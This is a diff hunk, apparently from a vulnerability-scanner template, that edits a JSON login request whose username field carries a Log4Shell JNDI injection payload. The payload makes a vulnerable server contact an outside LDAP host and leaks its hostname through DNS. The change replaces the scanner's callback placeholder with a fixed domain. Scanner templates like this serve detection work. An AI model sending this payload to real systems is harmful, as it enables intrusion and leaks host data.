@@ -35,7 +35,7 @@ http:
 
         {
           "authType": "password",
-          "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}",
+          "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com}",
           "password": "admin"
         }
 
